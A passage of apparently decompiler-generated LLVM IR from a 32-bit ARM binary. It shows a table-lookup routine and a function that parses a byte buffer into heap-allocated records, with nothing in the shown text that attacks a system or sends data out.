  %v2_adbc = load i8, i8* bitcast (i8** @global_var_1cd30.110 to i8*), align 4
  %v3_adbc = zext i8 %v2_adbc to i32
  %v2_adc0 = icmp eq i8 %v2_adbc, 0
  br i1 %v2_adc0, label %dec_label_pc_ae04, label %dec_label_pc_adc8

dec_label_pc_adc8:                                ; preds = %dec_label_pc_adb8
  store i32 ptrtoint (i32* @global_var_1cd34.112 to i32), i32* %r3.global-to-local, align 4
  %v2_adcc = load i32, i32* @global_var_1cd34.112, align 4
  %v1_add0 = inttoptr i32 %v2_adcc to i32*
  %v2_add0 = load i32, i32* %v1_add0, align 4
  %v1_add4 = add i32 %v2_add0, 4
  %v2_add4 = inttoptr i32 %v1_add4 to i8*
  %v3_add4 = load i8, i8* %v2_add4, align 1
  %v4_add4 = zext i8 %v3_add4 to i32
  store i32 %v4_add4, i32* %r3.global-to-local, align 4
  %v1_add8 = load i32, i32* %r7.global-to-local, align 4
  %v9_add8 = icmp eq i32 %v4_add4, %v1_add8
  br i1 %v9_add8, label %dec_label_pc_ae0c, label %dec_label_pc_adf8.preheader

dec_label_pc_adf8.preheader:                      ; preds = %dec_label_pc_adc8
  %v1_addc = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_adf8

dec_label_pc_ade8:                                ; preds = %dec_label_pc_adf8
  %v4_ade8 = mul i32 %v1_adf8, 4
  %v5_ade8 = add i32 %v4_ade8, %v2_adcc
  %v6_ade8 = inttoptr i32 %v5_ade8 to i32*
  %v7_ade8 = load i32, i32* %v6_ade8, align 4
  %v1_adec = add i32 %v7_ade8, 4
  %v2_adec = inttoptr i32 %v1_adec to i8*
  %v3_adec = load i8, i8* %v2_adec, align 1
  %v4_adec = zext i8 %v3_adec to i32
  store i32 %v4_adec, i32* %r3.global-to-local, align 4
  %v9_adf0 = icmp eq i32 %v4_adec, %v1_add8
  br i1 %v9_adf0, label %dec_label_pc_ae0c, label %dec_label_pc_adf8

dec_label_pc_adf8:                                ; preds = %dec_label_pc_adf8.preheader, %dec_label_pc_ade8
  %v0_adf8 = phi i32 [ %v1_addc, %dec_label_pc_adf8.preheader ], [ %v1_adf8, %dec_label_pc_ade8 ]
  %v1_adf8 = add i32 %v0_adf8, 1
  %v9_adfc = icmp eq i32 %v1_adf8, %v3_adbc
  br i1 %v9_adfc, label %dec_label_pc_ae04, label %dec_label_pc_ade8

dec_label_pc_ae04:                                ; preds = %dec_label_pc_adf8, %dec_label_pc_adb8, %dec_label_pc_ae0c
  call void @exit(i32 0)
  unreachable

dec_label_pc_ae0c:                                ; preds = %dec_label_pc_ade8, %dec_label_pc_adc8
  %v0_ae20 = phi i32 [ %v2_add0, %dec_label_pc_adc8 ], [ %v7_ade8, %dec_label_pc_ade8 ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v1_ae20 = inttoptr i32 %v0_ae20 to i32*
  %v2_ae20 = load i32, i32* %v1_ae20, align 4
  call void @__pseudo_branch(i32 %v2_ae20)
  br label %dec_label_pc_ae04

; uselistorder directives
  uselistorder i32 %v1_adf8, { 2, 0, 1 }
  uselistorder i32 %v0_ad7c, { 1, 2, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_ad5c, { 1, 0 }
  uselistorder i32 %v0_ad58, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 2, 0, 1 }
  uselistorder label %dec_label_pc_ae04, { 2, 0, 1 }
  uselistorder label %dec_label_pc_adf8, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
}

define i32 @function_ae30(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_ae30:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v9_ae30 = load i32, i32* @r6, align 4
  %v12_ae30 = load i32, i32* @r7, align 4
  %v18_ae30 = load i32, i32* @sb, align 4
  %v21_ae30 = load i32, i32* @sl, align 4
  %v27_ae30 = load i32, i32* @lr, align 4
  %v7_ae34 = icmp eq i32 %arg2, 3
  store i1 %v7_ae34, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r5, align 4
  %v0_ae40 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ae40, i32* @r4, align 4
  %tmp33 = icmp ult i32 %arg2, 4
  br i1 %tmp33, label %dec_label_pc_ae54, label %dec_label_pc_ae48

dec_label_pc_ae48:                                ; preds = %dec_label_pc_ae30
  %v7_ae48 = icmp eq i32 %arg2, 4
  store i1 %v7_ae48, i1* %cpsr_z.global-to-local, align 1
  %v1_ae4c = inttoptr i32 %v0_ae40 to i32*
  %v2_ae4c = load i32, i32* %v1_ae4c, align 4
  store i32 %v2_ae4c, i32* @sl, align 4
  br i1 %v7_ae48, label %dec_label_pc_ae54, label %dec_label_pc_ae5c

dec_label_pc_ae54:                                ; preds = %dec_label_pc_ae78, %.dec_label_pc_ae54_crit_edge, %dec_label_pc_ae48, %dec_label_pc_ae6c, %dec_label_pc_ae5c, %dec_label_pc_ae30
  %v29_ae58 = phi i32 [ %v29_ae58.pre, %.dec_label_pc_ae54_crit_edge ], [ %v0_ae40, %dec_label_pc_ae78 ], [ %v0_ae40, %dec_label_pc_ae48 ], [ %v0_ae40, %dec_label_pc_ae6c ], [ %v0_ae40, %dec_label_pc_ae5c ], [ %v0_ae40, %dec_label_pc_ae30 ]
  store i32 %v9_ae30, i32* @r6, align 4
  store i32 %v12_ae30, i32* @r7, align 4
  store i32 %v18_ae30, i32* @sb, align 4
  store i32 %v21_ae30, i32* @sl, align 4
  ret i32 %v29_ae58

dec_label_pc_ae5c:                                ; preds = %dec_label_pc_ae48
  %v7_ae5c = icmp eq i32 %arg2, 5
  store i1 %v7_ae5c, i1* %cpsr_z.global-to-local, align 1
  %v1_ae60 = add i32 %v0_ae40, 4
  %v2_ae60 = inttoptr i32 %v1_ae60 to i8*
  %v3_ae60 = load i8, i8* %v2_ae60, align 1
  %v4_ae60 = zext i8 %v3_ae60 to i32
  store i32 %v4_ae60, i32* %r1.global-to-local, align 4
  br i1 %v7_ae5c, label %dec_label_pc_ae54, label %dec_label_pc_ae6c

dec_label_pc_ae6c:                                ; preds = %dec_label_pc_ae5c
  %v1_ae6c = add i32 %v0_ae40, 5
  %v2_ae6c = inttoptr i32 %v1_ae6c to i8*
  %v3_ae6c = load i8, i8* %v2_ae6c, align 1
  %v4_ae6c = zext i8 %v3_ae6c to i32
  store i32 %v4_ae6c, i32* @r7, align 4
  %v2_ae70 = icmp eq i8 %v3_ae6c, 0
  store i1 %v2_ae70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ae70, label %dec_label_pc_ae54, label %dec_label_pc_ae78

dec_label_pc_ae78:                                ; preds = %dec_label_pc_ae6c
  %v3_ae78 = mul nuw nsw i32 %v4_ae6c, 4
  store i32 %v3_ae78, i32* @sb, align 4
  %v1_ae7c = add i32 %arg2, -6
  store i32 %v1_ae7c, i32* @r6, align 4
  %v2_ae80 = mul nuw nsw i32 %v4_ae6c, 5
  store i32 %v2_ae80, i32* @r8, align 4
  %v3_ae84 = icmp ult i32 %v1_ae7c, %v2_ae80
  %v9_ae84 = icmp eq i32 %v1_ae7c, %v2_ae80
  store i1 %v9_ae84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ae84, label %dec_label_pc_ae54, label %dec_label_pc_ae8c

dec_label_pc_ae8c:                                ; preds = %dec_label_pc_ae78
  store i32 %v4_ae6c, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  %v2_ae94 = call i32* @calloc(i32 %v4_ae6c, i32 24)
  %v4_ae94 = ptrtoint i32* %v2_ae94 to i32
  store i32 %v4_ae94, i32* %r0.global-to-local, align 4
  %v0_ae98 = load i32, i32* @r7, align 4
  %v2_ae98 = icmp eq i32 %v0_ae98, 0
  store i1 %v2_ae98, i1* %cpsr_z.global-to-local, align 1
  %v0_aea0 = load i32, i32* @r4, align 4
  %v1_aea0 = add i32 %v0_aea0, 6
  store i32 %v1_aea0, i32* %fp.global-to-local, align 4
  %tmp27 = icmp slt i32 %v0_ae98, 1
  br i1 %tmp27, label %dec_label_pc_aef8thread-pre-split, label %dec_label_pc_aea8

dec_label_pc_aea8:                                ; preds = %dec_label_pc_ae8c
  store i32 %v4_ae94, i32* %r1.global-to-local, align 4
  %v1_aeac = load i32, i32* @r8, align 4
  %v2_aeac = add i32 %v1_aeac, %v0_aea0
  store i32 %v2_aeac, i32* %ip.global-to-local, align 4
  store i32 %v0_aea0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_aebc

dec_label_pc_aebc:                                ; preds = %dec_label_pc_aebc.dec_label_pc_aebc_crit_edge, %dec_label_pc_aea8
  %v2_aecc = phi i32 [ %v1_aee0, %dec_label_pc_aebc.dec_label_pc_aebc_crit_edge ], [ %v4_ae94, %dec_label_pc_aea8 ]
  %v0_aec8 = phi i32 [ %v0_aec8.pre, %dec_label_pc_aebc.dec_label_pc_aebc_crit_edge ], [ %v2_aeac, %dec_label_pc_aea8 ]
  %v0_aec4 = phi i32 [ %v0_aebc.pre, %dec_label_pc_aebc.dec_label_pc_aebc_crit_edge ], [ %v0_aea0, %dec_label_pc_aea8 ]
  %v1_aebc = add i32 %v0_aec4, 10
  %v2_aebc = inttoptr i32 %v1_aebc to i8*
  %v3_aebc = load i8, i8* %v2_aebc, align 1
  %v1_aec0 = add i32 %v0_aec4, 6
  %v2_aec0 = inttoptr i32 %v1_aec0 to i32*
  %v3_aec0 = load i32, i32* %v2_aec0, align 4
  store i32 %v3_aec0, i32* %r2.global-to-local, align 4
  %v1_aec4 = add i32 %v0_aec4, 5
  store i32 %v1_aec4, i32* %r0.global-to-local, align 4
  %v9_aec8 = icmp eq i32 %v0_aec8, %v1_aec4
  store i1 %v9_aec8, i1* %cpsr_z.global-to-local, align 1
  %v3_aecc = add i32 %v2_aecc, 20
  %v4_aecc = inttoptr i32 %v3_aecc to i8*
  store i8 %v3_aebc, i8* %v4_aecc, align 1
  %v0_aed0 = load i32, i32* %r2.global-to-local, align 4
  %v1_aed0 = load i32, i32* %r1.global-to-local, align 4
  %v2_aed0 = add i32 %v1_aed0, 4
  %v3_aed0 = inttoptr i32 %v2_aed0 to i32*
  store i32 %v0_aed0, i32* %v3_aed0, align 4
  %v0_aed4 = load i32, i32* %r2.global-to-local, align 4
  %v1_aed4 = load i32, i32* %r1.global-to-local, align 4
  %v2_aed4 = add i32 %v1_aed4, 16
  %v3_aed4 = inttoptr i32 %v2_aed4 to i32*
  store i32 %v0_aed4, i32* %v3_aed4, align 4
  %v0_aed8 = load i32, i32* @r4, align 4
  %v1_aed8 = trunc i32 %v0_aed8 to i8
  %v2_aed8 = load i32, i32* %r1.global-to-local, align 4
  %v3_aed8 = inttoptr i32 %v2_aed8 to i8*
  store i8 %v1_aed8, i8* %v3_aed8, align 1
  %v0_aedc = load i32, i32* %lr.global-to-local, align 4
  %v1_aedc = trunc i32 %v0_aedc to i8
  %v2_aedc = load i32, i32* %r1.global-to-local, align 4
  %v3_aedc = add i32 %v2_aedc, 1
  %v4_aedc = inttoptr i32 %v3_aedc to i8*
  store i8 %v1_aedc, i8* %v4_aedc, align 1
  %v0_aee0 = load i32, i32* %r1.global-to-local, align 4
  %v1_aee0 = add i32 %v0_aee0, 24
  store i32 %v1_aee0, i32* %r1.global-to-local, align 4
  %v0_aee4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_aee4, label %dec_label_pc_aee8, label %dec_label_pc_aebc.dec_label_pc_aebc_crit_edge

dec_label_pc_aebc.dec_label_pc_aebc_crit_edge:    ; preds = %dec_label_pc_aebc
  %v0_aebc.pre = load i32, i32* %r0.global-to-local, align 4
  %v0_aec8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_aebc

dec_label_pc_aee8:                                ; preds = %dec_label_pc_aebc
  %v0_aee8 = load i32, i32* @sb, align 4
  %v1_aee8 = load i32, i32* @r7, align 4
  %v1_aeec = load i32, i32* @r5, align 4
  %sum = add i32 %v1_aee8, %v0_aee8
  %v2_aeec = sub i32 %v1_aeec, %sum
  %v0_aef0 = load i32, i32* %r0.global-to-local, align 4
  %v1_aef0 = add i32 %v0_aef0, 6
  store i32 %v1_aef0, i32* %fp.global-to-local, align 4
  %v1_aef4 = add i32 %v2_aeec, -6
  store i32 %v1_aef4, i32* @r6, align 4
  br label %dec_label_pc_aef8

dec_label_pc_aef8thread-pre-split:                ; preds = %dec_label_pc_ae8c
  %v0_aef8.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_aef8

dec_label_pc_aef8:                                ; preds = %dec_label_pc_aef8thread-pre-split, %dec_label_pc_aee8
  %v0_af04 = phi i32 [ %v1_aea0, %dec_label_pc_aef8thread-pre-split ], [ %v1_aef0, %dec_label_pc_aee8 ]
  %v1_aefc = phi i32 [ %v0_aef8.pr, %dec_label_pc_aef8thread-pre-split ], [ %v1_aef4, %dec_label_pc_aee8 ]
  %v2_aef8 = icmp eq i32 %v1_aefc, 0
  store i1 %v2_aef8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_aef8, label %dec_label_pc_b030, label %dec_label_pc_af04

dec_label_pc_af04:                                ; preds = %dec_label_pc_aef8
  %v1_af04 = inttoptr i32 %v0_af04 to i8*
  %v2_af04 = load i8, i8* %v1_af04, align 1
  %v3_af04 = zext i8 %v2_af04 to i32
  store i32 %v3_af04, i32* @sb, align 4
  %v2_af08 = icmp eq i8 %v2_af04, 0
  store i1 %v2_af08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_af08, label %dec_label_pc_afe8, label %dec_label_pc_af18

dec_label_pc_af18:                                ; preds = %dec_label_pc_af04
  store i32 %v3_af04, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_af20 = call i32* @calloc(i32 %v3_af04, i32 8)
  %v4_af20 = ptrtoint i32* %v2_af20 to i32
  store i32 %v4_af20, i32* %r0.global-to-local, align 4
  %v0_af24 = load i32, i32* @sb, align 4
  %v2_af24 = icmp eq i32 %v0_af24, 0
  store i1 %v2_af24, i1* %cpsr_z.global-to-local, align 1
  %tmp28 = icmp slt i32 %v0_af24, 1
  br i1 %tmp28, label %dec_label_pc_afe8, label %dec_label_pc_af34

dec_label_pc_af34:                                ; preds = %dec_label_pc_af18
  %v0_af34 = load i32, i32* @r6, align 4
  %v1_af34 = add i32 %v0_af34, -1
  store i32 %v1_af34, i32* %r2.global-to-local, align 4
  %v7_af34 = icmp eq i32 %v0_af34, 1
  store i1 %v7_af34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_af34, label %dec_label_pc_b030, label %dec_label_pc_af3c

dec_label_pc_af3c:                                ; preds = %dec_label_pc_af34
  %v0_af3c = load i32, i32* %fp.global-to-local, align 4
  %v1_af3c = add i32 %v0_af3c, 1
  %v2_af3c = inttoptr i32 %v1_af3c to i8*
  %v3_af3c = load i8, i8* %v2_af3c, align 1
  %v1_af40 = add i32 %v0_af34, -2
  store i32 %v1_af40, i32* %r2.global-to-local, align 4
  %v7_af40 = icmp eq i32 %v1_af34, 1
  store i1 %v7_af40, i1* %cpsr_z.global-to-local, align 1
  %v3_af44 = add i32 %v4_af20, 4
  %v4_af44 = inttoptr i32 %v3_af44 to i8*
  store i8 %v3_af3c, i8* %v4_af44, align 1
  %v0_af48 = load i32, i32* %fp.global-to-local, align 4
  %v1_af48 = add i32 %v0_af48, 1
  store i32 %v1_af48, i32* %r0.global-to-local, align 4
  %v0_af4c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_af4c, label %dec_label_pc_b030, label %dec_label_pc_af50

dec_label_pc_af50:                                ; preds = %dec_label_pc_af3c
  %v1_af50 = add i32 %v0_af48, 2
  %v2_af50 = inttoptr i32 %v1_af50 to i8*
  %v3_af50 = load i8, i8* %v2_af50, align 1
  %v4_af50 = zext i8 %v3_af50 to i32
  store i32 %v4_af50, i32* @r4, align 4
  %v0_af54 = load i32, i32* %r2.global-to-local, align 4
  %v1_af54 = add i32 %v0_af54, -1
  store i32 %v1_af54, i32* @r8, align 4
  %v9_af58 = icmp eq i32 %v1_af54, %v4_af50
  store i1 %v9_af58, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_af50, i32* %r0.global-to-local, align 4
  %v5_af60 = icmp slt i32 %v1_af54, %v4_af50
  br i1 %v5_af60, label %dec_label_pc_b030, label %dec_label_pc_af64

dec_label_pc_af64:                                ; preds = %dec_label_pc_af50
  store i32 %v4_af20, i32* @r5, align 4
  %v1_af6c = add i32 %v4_af20, 8
  %v1_af70 = add i32 %v0_af48, 3
  store i32 %v1_af70, i32* @r6, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_afb4

dec_label_pc_af80:                                ; preds = %dec_label_pc_afb4
  %v0_af80 = load i32, i32* @r8, align 4
  %v1_af80 = load i32, i32* @r4, align 4
  %v2_af80 = sub i32 %v0_af80, %v1_af80
  store i32 %v2_af80, i32* %r2.global-to-local, align 4
  %v9_af80 = icmp eq i32 %v0_af80, %v1_af80
  store i1 %v9_af80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_af80, label %dec_label_pc_b030, label %dec_label_pc_af88

dec_label_pc_af88:                                ; preds = %dec_label_pc_af80
  %v1_af88 = load i32, i32* @r6, align 4
  %v2_af88 = add i32 %v1_af88, %v1_af80
  %v3_af88 = inttoptr i32 %v2_af88 to i8*
  %v4_af88 = load i8, i8* %v3_af88, align 1
  store i32 %v2_af88, i32* %r0.global-to-local, align 4
  %v1_af90 = add i32 %v2_af80, -1
  store i32 %v1_af90, i32* %r2.global-to-local, align 4
  %v7_af90 = icmp eq i32 %v2_af80, 1
  store i1 %v7_af90, i1* %cpsr_z.global-to-local, align 1
  %v3_af94 = add i32 %v2_af94, 4
  %v4_af94 = inttoptr i32 %v3_af94 to i8*
  store i8 %v4_af88, i8* %v4_af94, align 1
  %v0_af98 = load i32, i32* %r0.global-to-local, align 4
  %v0_af9c = load i32, i32* %r2.global-to-local, align 4
  %v1_af9c = add i32 %v0_af9c, -1
  store i32 %v1_af9c, i32* @r8, align 4
  %v1_afa0 = add i32 %v0_af98, 2
  store i32 %v1_afa0, i32* @r6, align 4
  %v0_afa4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_afa4, label %dec_label_pc_b030, label %dec_label_pc_afa8

dec_label_pc_afa8:                                ; preds = %dec_label_pc_af88
  %v1_af98 = add i32 %v0_af98, 1
  %v2_afa8 = inttoptr i32 %v1_af98 to i8*
  %v3_afa8 = load i8, i8* %v2_afa8, align 1
  %v4_afa8 = zext i8 %v3_afa8 to i32
  store i32 %v4_afa8, i32* @r4, align 4
  %v2_afac = sub i32 %v1_af9c, %v4_afa8
  %tmp30 = sub i32 0, %v2_afac
  %v6_afac = and i32 %v1_af9c, %tmp30
  %v7_afac = icmp slt i32 %v6_afac, 0
  %v8_afac = icmp slt i32 %v2_afac, 0
  %v9_afac = icmp eq i32 %v1_af9c, %v4_afa8
  store i1 %v9_afac, i1* %cpsr_z.global-to-local, align 1
  %v2_afb0 = xor i1 %v8_afac, %v7_afac
  br i1 %v2_afb0, label %dec_label_pc_b030, label %dec_label_pc_afb4

dec_label_pc_afb4:                                ; preds = %dec_label_pc_afa8, %dec_label_pc_af64
  %v0_afb8 = phi i32 [ %v4_af50, %dec_label_pc_af64 ], [ %v4_afa8, %dec_label_pc_afa8 ]
  %v2_af94 = phi i32 [ %v1_af6c, %dec_label_pc_af64 ], [ %v1_afd8, %dec_label_pc_afa8 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_afb8 = add nuw nsw i32 %v0_afb8, 1
  store i32 %v1_afb8, i32* %r0.global-to-local, align 4
  %v2_afbc = call i32* @calloc(i32 %v1_afb8, i32 1)
  %v3_afbc = ptrtoint i32* %v2_afbc to i32
  store i32 %v3_afbc, i32* %r0.global-to-local, align 4
  %v0_afc0 = load i32, i32* @r6, align 4
  store i32 %v0_afc0, i32* %r1.global-to-local, align 4
  %v1_afc4 = load i32, i32* @r5, align 4
  %v2_afc4 = inttoptr i32 %v1_afc4 to i32*
  store i32 %v3_afbc, i32* %v2_afc4, align 4
  %v0_afc8 = load i32, i32* @r4, align 4
  store i32 %v0_afc8, i32* %r2.global-to-local, align 4
  %v3_afcc = call i32 @function_13a84(i32 %v3_afbc, i32 %v0_afc0, i32 %v0_afc8)
  store i32 %v3_afcc, i32* %r0.global-to-local, align 4
  store i32 %v2_af94, i32* @r5, align 4
  %v0_afd4 = load i32, i32* %fp.global-to-local, align 4
  %v1_afd4 = add i32 %v0_afd4, 1
  store i32 %v1_afd4, i32* %fp.global-to-local, align 4
  %v1_afd8 = add i32 %v2_af94, 8
  store i32 %v1_afd8, i32* %ip.global-to-local, align 4
  %v1_afdc = load i32, i32* @sb, align 4
  %v9_afdc = icmp eq i32 %v1_afd4, %v1_afdc
  store i1 %v9_afdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_afdc, label %dec_label_pc_afe8, label %dec_label_pc_af80

dec_label_pc_afe8:                                ; preds = %dec_label_pc_afb4, %dec_label_pc_af18, %dec_label_pc_af04
  %stack_var_-48.1 = phi i32 [ %v3_af04, %dec_label_pc_af04 ], [ %v0_af24, %dec_label_pc_af18 ], [ %v0_af24, %dec_label_pc_afb4 ]
  %stack_var_-52.2 = phi i32 [ %v3_af04, %dec_label_pc_af04 ], [ %v4_af20, %dec_label_pc_af18 ], [ %v4_af20, %dec_label_pc_afb4 ]
  %v0_afe8 = call i32* @__errno_location()
  %v0_afec = load i32, i32* @sl, align 4
  %v1_afec = and i32 %v0_afec, ptrtoint (i32* @global_var_ff00.79 to i32)
  store i32 %stack_var_-48.1, i32* %ip.global-to-local, align 4
  %v3_aff8 = mul i32 %v0_afec, 16777216
  %v4_affc = mul i32 %v1_afec, 256
  %v5_affc = or i32 %v4_affc, %v3_aff8
  store i32 %v5_affc, i32* %r1.global-to-local, align 4
  %v1_aff4 = udiv i32 %v0_afec, 256
  %v3_b000 = and i32 %v1_aff4, 65280
  store i32 %v3_b000, i32* %r2.global-to-local, align 4
  store i32 0, i32* %v0_afe8, align 4
  %v1_b00c = load i32, i32* @sl, align 4
  %v4_b00c = udiv i32 %v1_b00c, 16777216
  %v5_b00c = or i32 %v4_b00c, %v3_b000
  %v0_b010 = load i32, i32* %ip.global-to-local, align 4
  store i32 %stack_var_-52.2, i32* %ip.global-to-local, align 4
  %v1_b018 = load i32, i32* %r1.global-to-local, align 4
  %v2_b018 = or i32 %v5_b00c, %v1_b018
  store i32 %v2_b018, i32* %r0.global-to-local, align 4
  store i32 %v4_ae60, i32* %r1.global-to-local, align 4
  %v0_b024 = load i32, i32* @r7, align 4
  store i32 %v0_b024, i32* %r2.global-to-local, align 4
  %v6_b02c = trunc i32 %v0_b010 to i8
  %v7_b02c = call i32 @function_ad40(i32 %v2_b018, i32 %v4_ae60, i32 %v0_b024, i32 %v4_ae94, i8 %v6_b02c, i32 %stack_var_-52.2)
  store i32 %v7_b02c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b030

dec_label_pc_b030:                                ; preds = %dec_label_pc_afa8, %dec_label_pc_af88, %dec_label_pc_af80, %dec_label_pc_af50, %dec_label_pc_af3c, %dec_label_pc_af34, %dec_label_pc_aef8, %dec_label_pc_afe8
  %stack_var_-52.3 = phi i32 [ 0, %dec_label_pc_aef8 ], [ %stack_var_-52.2, %dec_label_pc_afe8 ], [ %v4_af20, %dec_label_pc_af34 ], [ %v4_af20, %dec_label_pc_af3c ], [ %v4_af20, %dec_label_pc_af50 ], [ %v4_af20, %dec_label_pc_af80 ], [ %v4_af20, %dec_label_pc_af88 ], [ %v4_af20, %dec_label_pc_afa8 ]
  store i32 %v4_ae94, i32* %r1.global-to-local, align 4
  %v2_b034 = icmp eq i32* %v2_ae94, null
  store i1 %v2_b034, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b034, label %bb31, label %bb

bb:                                               ; preds = %dec_label_pc_b030
  store i32 %v4_ae94, i32* %r0.global-to-local, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_b030, %bb
  store i32 45120, i32* %lr.global-to-local, align 4
  %v1_b03c = xor i1 %v2_b034, true
  call void @__pseudo_cond_branch(i1 %v1_b03c, i32 ptrtoint (i32* @global_var_8de4.114 to i32))
  %v2_b044 = icmp eq i32 %stack_var_-52.3, 0
  store i1 %v2_b044, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b044, label %.dec_label_pc_ae54_crit_edge, label %dec_label_pc_b04c

.dec_label_pc_ae54_crit_edge:                     ; preds = %bb31
  %v29_ae58.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ae54

dec_label_pc_b04c:                                ; preds = %bb31
  %v0_b04c = load i32, i32* @sb, align 4
  %v2_b04c = icmp eq i32 %v0_b04c, 0
  store i1 %v2_b04c, i1* %cpsr_z.global-to-local, align 1
  %tmp32 = icmp slt i32 %v0_b04c, 1
  br i1 %tmp32, label %dec_label_pc_b074, label %dec_label_pc_b054

dec_label_pc_b054:                                ; preds = %dec_label_pc_b04c
  br label %dec_label_pc_b058

dec_label_pc_b058:                                ; preds = %dec_label_pc_b058, %dec_label_pc_b054
  %v0_b064 = phi i32 [ %v1_b064, %dec_label_pc_b058 ], [ 0, %dec_label_pc_b054 ]
  store i32 %stack_var_-52.3, i32* %ip.global-to-local, align 4
  %v4_b05c = mul i32 %v0_b064, 8
  %v5_b05c = add i32 %v4_b05c, %stack_var_-52.3
  %v6_b05c = inttoptr i32 %v5_b05c to i32*
  %v7_b05c = load i32, i32* %v6_b05c, align 4
  store i32 %v7_b05c, i32* %r0.global-to-local, align 4
  %v2_b060 = icmp eq i32 %v7_b05c, 0
  store i1 %v2_b060, i1* %cpsr_z.global-to-local, align 1
  %v1_b064 = add i32 %v0_b064, 1
  store i32 45164, i32* %lr.global-to-local, align 4
  %v1_b068 = xor i1 %v2_b060, true
  call void @__pseudo_cond_branch(i1 %v1_b068, i32 ptrtoint (i32* @global_var_8de4.114 to i32))
  %v0_b06c = load i32, i32* @sb, align 4
  %v9_b06c = icmp eq i32 %v0_b06c, %v1_b064
  store i1 %v9_b06c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b06c, label %dec_label_pc_b074, label %dec_label_pc_b058

dec_label_pc_b074:                                ; preds = %dec_label_pc_b058, %dec_label_pc_b04c
  store i32 %stack_var_-52.3, i32* %r0.global-to-local, align 4
  store i32 %v9_ae30, i32* @r6, align 4
  store i32 %v12_ae30, i32* @r7, align 4
  store i32 %v18_ae30, i32* @sb, align 4
  store i32 %v21_ae30, i32* @sl, align 4
  store i32 %v27_ae30, i32* %lr.global-to-local, align 4
  %v1_b080 = inttoptr i32 %stack_var_-52.3 to i32*
  call void @free(i32* %v1_b080)
  store i32 ptrtoint (i32* @0 to i32), i32* %r0.global-to-local, align 4
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder i1 %v2_b034, { 0, 2, 1 }
  uselistorder i32 %stack_var_-52.3, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_afec, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.2, { 1, 0, 2 }
  uselistorder i32 %v1_afd8, { 1, 0 }
  uselistorder i32 %v3_afbc, { 0, 2, 1 }
  uselistorder i32 %v2_af94, { 2, 1, 0 }
  uselistorder i32 %v2_afac, { 1, 0 }
  uselistorder i32 %v4_afa8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_af9c, { 2, 0, 1, 3 }
  uselistorder i32 %v0_af98, { 1, 0 }
  uselistorder i32 %v0_af34, { 0, 2, 1 }
  uselistorder i32 %v0_af24, { 0, 2, 1, 3 }
  uselistorder i32 %v4_af20, { 0, 1, 2, 8, 7, 6, 3, 5, 9, 10, 4, 11 }
  uselistorder i32 %v3_af04, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_aee0, { 1, 0 }
  uselistorder i32 %v0_aec4, { 0, 2, 1 }
  uselistorder i32 %v0_aea0, { 1, 2, 0, 3 }
  uselistorder i32 %v4_ae94, { 0, 3, 4, 1, 2, 5 }
  uselistorder i32 %v2_ae80, { 2, 1, 0 }
  uselistorder i32 %v4_ae6c, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v4_ae60, { 1, 0, 2 }
  uselistorder i32 %v0_ae40, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 5, 2, 3, 4, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 22, 6, 2, 7, 10, 14, 11, 8, 9, 12, 13, 20, 15, 17, 16, 18, 19, 23, 21, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 4, 5, 3, 6 }
